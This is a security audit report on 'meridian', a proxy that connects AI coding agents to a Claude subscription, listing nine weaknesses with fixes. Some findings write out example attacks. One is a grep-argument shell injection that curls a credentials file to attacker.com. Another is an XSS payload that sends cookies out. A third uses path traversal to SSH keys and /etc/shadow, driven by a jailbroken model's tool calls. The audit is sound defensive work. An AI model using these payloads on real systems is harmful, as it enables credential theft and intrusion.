# Security Scan Report — `jvalteren/meridian`

**Scan date:** 2026-04-13  
**Scanned revision:** `copilot/scan-codebase-for-malicious-code`  
**Scope:** All TypeScript source files under `src/`, shell scripts under `bin/`, and the `plugin/` directory, plus `Dockerfile` and `package.json`.

---

## Executive Summary

The codebase is a local proxy that bridges AI coding agents (OpenCode, ForgeCode, Crush, etc.) to the Claude Max subscription via the Anthropic Agent SDK.  **No intentionally malicious code was found.** There are no obfuscated payloads, no data exfiltration channels, no hardcoded secrets, no privilege-escalation attempts, and no cryptomining or unexpected background processes.

Several genuine security concerns were identified—some significant, some minor—spanning shell injection, access control gaps, credential handling, and XSS. All appear to be engineering trade-offs rather than deliberate backdoors, and each has a clear remediation path.

---

## Findings

### 1. Shell Injection via AI-Controlled MCP `grep` Tool — **HIGH**

**File:** `src/mcpTools.ts`, line 184

```ts
let cmd = `grep -rn --include="${includePattern}" "${args.pattern}" "${searchPath}" 2>/dev/null || true`
const { stdout } = await execAsync(cmd, { maxBuffer: 10 * 1024 * 1024 })
```

The `pattern`, `include`, and `path` arguments originate from the AI model (via MCP tool call) and are interpolated directly into a shell command string executed through `execAsync` (which uses `sh -c` under the hood).

A crafted argument such as:

```
args.pattern = 'foo"; curl http://attacker.com -d "$(cat ~/.claude/.credentials.json); echo "'
```

would execute arbitrary shell commands under the proxy user's account.

**Root cause:** `execAsync` wraps `child_process.exec`, which invokes a shell. Shell metacharacters in interpolated values are interpreted.

**Remediation:** Replace the shell-based invocation with `execFile` (no shell) and pass the pattern and paths as discrete arguments:

```ts
await execFile("grep", ["-rn", "--include", includePattern, args.pattern, searchPath], ...)
```

Alternatively, use a pure-JavaScript grep library or Node's `fs` APIs.

**Context:** Exploitation requires the model to be maliciously prompted or jailbroken. However, the threat model of an AI proxy explicitly includes adversarial prompts, so this is a realistic attack surface.

---

### 2. Unrestricted Filesystem Read/Write in MCP Tools — **MEDIUM**

**File:** `src/mcpTools.ts`, lines 40–43, 65–68, 92–95

```ts
const filePath = path.isAbsolute(args.path)
  ? args.path
  : path.resolve(getCwd(), args.path)
```

The `read`, `write`, and `edit` MCP tools accept any absolute or relative path with no restriction. There is no check that the resolved path remains within the configured working directory. A model prompted with `args.path = "/home/user/.ssh/id_rsa"` or `"../../../../etc/shadow"` would succeed.

The `write` tool additionally calls `fs.mkdir(path.dirname(filePath), { recursive: true })`, allowing arbitrary directory creation anywhere on the filesystem.

**Remediation:** After resolving the path, verify that it starts with the working directory prefix before proceeding:

```ts
const resolved = path.resolve(getCwd(), args.path)
if (!resolved.startsWith(getCwd() + path.sep) && resolved !== getCwd()) {
  throw new Error("Path outside working directory")
}
```

---

### 3. Wildcard CORS Policy — **MEDIUM**

**File:** `src/proxy/server.ts`, line 207

```ts
app.use("*", cors())
```

Hono's `cors()` with no options emits `Access-Control-Allow-Origin: *`. While the server binds to `127.0.0.1` by default, this wildcard policy means any web page open in a browser on the same machine can make cross-origin requests to the proxy, bypassing the browser's Same-Origin Policy protection.

Combined with the telemetry and settings APIs (`/telemetry`, `/settings`, `/profiles`), a malicious web page could:

- Read all recent session metadata and error messages.
- Change feature flags and profile settings.
- Trigger profile switches.

The Docker image sets `CLAUDE_PROXY_HOST=0.0.0.0`, making this more severe in network-accessible deployments.

**Remediation:** Restrict origins to `http://localhost:*` and `http://127.0.0.1:*`, or gate the CORS middleware to only apply to the `/v1/messages` endpoint (which must be reachable by agent tools):

```ts
app.use("/v1/*", cors({ origin: ["http://localhost:3456", "http://127.0.0.1:3456"] }))
```

---

### 4. XSS in Telemetry Dashboard — **MEDIUM**

**File:** `src/telemetry/dashboard.ts`, lines 267, 280–284, 329

```ts
const statusText = r.error ? r.error : r.status
// ...
+ '<td class="' + statusClass + '">' + statusText + '</td>'
// ...
+ '<td class="mono" style="word-break:break-all">' + log.message + '</td>'
```

The fields `r.error`, `r.adapter`, `r.model`, `r.requestModel`, `r.mode`, `r.lineageType`, and `log.message` are injected directly into `innerHTML` without HTML escaping. These values derive from:

- Error messages returned by the Anthropic API.
- Request metadata arriving over the HTTP API.

If an Anthropic error response or a diagnostic log message contains HTML/JS (e.g. `<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>`), it executes when the telemetry dashboard is opened in a browser.

**Note:** `src/telemetry/profilePage.ts` and `src/telemetry/profileBar.ts` define and use an `esc()` helper correctly:

```ts
function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
```

The same protection is absent from `dashboard.ts`.

**Remediation:** Apply the same `esc()` helper (or equivalent) to all data-derived values before inserting them into `innerHTML` in `dashboard.ts`.

---

### 5. Hardcoded OAuth Client ID — **LOW-MEDIUM**

**File:** `src/proxy/tokenRefresh.ts`, lines 25–26

```ts
const OAUTH_TOKEN_URL = "https://platform.claude.com/v1/oauth/token"
const OAUTH_CLIENT_ID = "9d1c250a-e61b-44d9-88ed-5944d1962f5e"
```

The OAuth client ID is hardcoded. This means:

1. Token refresh requests present as Claude Code's first-party application to Anthropic's servers — effectively impersonating the official client.
2. If Anthropic rotates or revokes this client ID, all token refreshes silently fail with no clear error.

While OAuth client IDs are generally semi-public (they are not OAuth secrets), using a third-party application's registered client ID without explicit authorization may violate Anthropic's Terms of Service.

**Remediation:** Coordinate with Anthropic to register a dedicated OAuth client for Meridian, or document clearly that this behavior relies on Claude Code's client registration.

---

### 6. Static HMAC Key for API Key Comparison — **LOW**

**File:** `src/proxy/auth.ts`, lines 31–32

```ts
const hashA = createHmac("sha256", "meridian").update(a).digest()
const hashB = createHmac("sha256", "meridian").update(b).digest()
```

The HMAC key used to produce equal-length buffers for `timingSafeEqual` is the static string `"meridian"`, which is publicly known from the source code. While `timingSafeEqual` correctly prevents timing side-channel attacks, any adversary with knowledge of the key can precompute `HMAC("meridian", candidate)` for all plausible API keys offline, reducing the effective strength of the comparison.

**Remediation:** Derive the HMAC key from the configured `MERIDIAN_API_KEY` itself (or a random per-process secret), so the key is not publicly known:

```ts
const hmacKey = process.env.MERIDIAN_API_KEY ?? "meridian"
const hashA = createHmac("sha256", hmacKey).update(a).digest()
const hashB = createHmac("sha256", hmacKey).update(b).digest()
```

---

### 7. Credentials File Written Without Explicit Mode (Linux) — **LOW**

**File:** `src/proxy/tokenRefresh.ts`, line 133

```ts
writeFileSync(CREDENTIALS_FILE, JSON.stringify(credentials, null, 2), "utf-8")
```

The Linux credential store (`~/.claude/.credentials.json`) is written without specifying a file mode. The resulting permissions depend on the process `umask`. With a permissive umask (e.g., `0022`), the credentials file is world-readable, exposing OAuth access and refresh tokens to any local user.

The macOS Keychain backend is unaffected.

**Remediation:** Add `{ mode: 0o600 }` to the `writeFileSync` call:

```ts
writeFileSync(CREDENTIALS_FILE, JSON.stringify(credentials, null, 2), { encoding: "utf-8", mode: 0o600 })
```

---

### 8. Docker Default: Unauthenticated Proxy on All Interfaces — **LOW**

**File:** `Dockerfile` (final `ENV` block)

```dockerfile
ENV CLAUDE_PROXY_PASSTHROUGH=1 \
    CLAUDE_PROXY_HOST=0.0.0.0 \
    IS_SANDBOX=1
```

The Docker image binds to `0.0.0.0` (all interfaces) by default. Because `MERIDIAN_API_KEY` is unset by default, any process that can reach the exposed port can submit requests—consuming the user's Claude Max quota with no authentication.

**Remediation:** Set `MERIDIAN_API_KEY` in `docker-compose.yml` as a required variable (or document prominently that it must be set before deploying to an accessible network). Consider adding a warning to container startup when auth is disabled and the host is `0.0.0.0`.

---

### 9. Profile `env` Allows Arbitrary Environment Variable Injection — **LOW**

**Files:** `src/proxy/profiles.ts` (line 189), `src/proxy/server.ts` (line 310)

```ts
const profileEnv = { ...cleanEnv, ...profile.env }
```

Profile objects loaded from `~/.config/meridian/profiles.json` can specify arbitrary `env` key-value pairs that are merged into the SDK subprocess environment. A maliciously crafted profiles file could inject sensitive environment variables (e.g., `LD_PRELOAD`, `NODE_OPTIONS`, `PATH`) into the Claude Code subprocess.

**Severity note:** Exploitation requires write access to the user's home directory config, which implies prior local compromise. This is primarily a defense-in-depth concern.

**Remediation:** Allowlist the environment variables that profiles are permitted to set (e.g., `CLAUDE_CONFIG_DIR`, `ANTHROPIC_API_KEY`, `ANTHROPIC_BASE_URL`) and strip all others from `profile.env` before merging.

---

## No Evidence Of

The following attack categories were explicitly checked and found to be **absent**:

| Category | Finding |
|---|---|
| Data exfiltration | No unexpected outbound HTTP calls. The only external call is `https://platform.claude.com/v1/oauth/token` for token refresh. |
| Obfuscated code | All source is readable TypeScript. No `eval`, `Function()`, encoded payloads, or dynamic `require`. |
| Privilege escalation | No `sudo`, `setuid`, capability-setting calls, or `chown` to root. |
| Cryptomining / background processes | No hidden timers, unexpected spawned processes, or background network activity. |
| Hardcoded API keys or passwords | No Anthropic API keys, bearer tokens, or passwords in source. |
| Supply-chain tampering | Only four runtime dependencies (`@anthropic-ai/claude-agent-sdk`, `libsql`, `hono`, `@hono/node-server`)—all well-known, pinned in `bun.lock`. |
| Suspicious shell scripts | The three shell scripts (`claude-proxy-supervisor.sh`, `docker-entrypoint.sh`, `docker-auth.sh`) perform only documented, expected operations. |

---

## Summary Table

| # | Finding | File | Severity |
|---|---|---|---|
| 1 | Shell injection via AI-controlled MCP `grep` tool | `src/mcpTools.ts:184` | **HIGH** |
| 2 | Unrestricted filesystem read/write in MCP tools | `src/mcpTools.ts:40–94` | **MEDIUM** |
| 3 | Wildcard CORS policy | `src/proxy/server.ts:207` | **MEDIUM** |
| 4 | XSS in telemetry dashboard (unescaped `innerHTML`) | `src/telemetry/dashboard.ts:267–329` | **MEDIUM** |
| 5 | Hardcoded OAuth client ID | `src/proxy/tokenRefresh.ts:25–26` | **LOW-MEDIUM** |
| 6 | Static HMAC key for API key comparison | `src/proxy/auth.ts:31–32` | **LOW** |
| 7 | Credentials file written without explicit 0o600 mode | `src/proxy/tokenRefresh.ts:133` | **LOW** |
| 8 | Docker default: unauthenticated on all interfaces | `Dockerfile` | **LOW** |
| 9 | Profile `env` allows arbitrary env var injection | `src/proxy/profiles.ts`, `src/proxy/server.ts` | **LOW** |
